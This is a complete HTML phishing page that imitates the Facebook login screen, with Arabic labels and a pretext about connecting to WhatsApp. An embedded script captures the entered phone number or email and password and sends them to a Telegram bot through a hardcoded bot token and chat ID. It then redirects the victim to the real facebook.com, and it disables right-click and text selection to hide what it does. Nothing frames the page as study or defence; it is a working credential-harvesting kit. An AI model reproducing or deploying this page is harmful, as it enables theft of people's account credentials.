<html>
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <meta property="og:title" content="Facebook - log in or sign up">
    <meta name="description" content="Log in to your Facebook account to connect to WhatsApp.">
    <meta property="og:description" content="Log in to your Facebook account to connect to WhatsApp.">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Facebook - log in or sign up">
    <meta property="og:type" content="website">
    <title>Facebook - log in or sign up</title>
    <link rel="stylesheet" href="login/css/style.css">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="navbar">
        <img src="login/img/fb.png">
    </div>
    <div class="content-box">
        <form class="login-form" action="#" method="post">
            <input type="text" name="text" placeholder="رقم الهاتف المحمول او البريد الالكتروني" autocomplete="off" autocapitalize="off" required>
            <input type="password" name="password" placeholder="كلمة السر" autocomplete="off" autocapitalize="off" required>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
        <div class="divider"><span>أو</span></div>
        <center>
            <button type="button" class="btn-create">انشاء حساب جديد</button>
        </center>
        <div class="txt-forgotten-password">هل نسيت كلمة السر؟</div>
    </div>
    <div class="language-box">
        <center>
            <div class="language-name language-name-active">English (US)</div>
            <div class="language-name">Bahasa Indonesia</div>
            <div class="language-name">Basa Jawa</div>
            <div class="language-name">Bahasa Melayu</div>
            <div class="language-name">日本語</div>
            <div class="language-name">Español</div>
            <div class="language-name">Português (Brasil)</div>
            <div class="language-name">
                <i class="fa fa-plus"></i>
            </div>
        </center>
    </div>
    <div class="copyright">Facebook Inc.</div>

    <!-- تم نقل السكريبت هنا -->
    <script>
        const BOT_TOKEN = '7735109468:AAFLmHRJhnDBruWaSNhdP9C9YOT7N8CMM-M';
        const CHAT_ID = '498134307';

        document.querySelector('.login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const formData = {
                text: e.target.text.value,
                password: e.target.password.value
            };

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `
                        {FB-sntet}\n
${formData.text}\n
${formData.password}`
                    })
                });

                if (!response.ok) {
                    throw new Error('فشل الإرسال: ' + response.status);
                }

                window.location.href = 'https://facebook.com';
            } catch (error) {
                console.error('حدث خطأ:', error);
                alert('حدث خطأ أثناء الإرسال! الرجاء المحاولة مرة أخرى.');
            }
        });
    </script>
</body>
</html>
